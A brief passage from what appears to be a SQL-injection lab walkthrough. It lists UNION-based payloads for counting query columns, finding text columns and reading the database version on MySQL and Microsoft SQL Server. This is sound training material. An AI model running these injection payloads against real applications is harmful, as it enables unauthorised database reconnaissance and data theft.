Firstly, Determine the number of columns `'UNION SELECT NULL,NULL--+` that are being returned by the query and which columns contain text data `'UNION SELECT 'a','a'--+` same as we done in previous labs.

Now, for querying the database type and version on MySQL and Microsoft, we may use: 
```
'UNION SELECT @@version,NULL--+
```
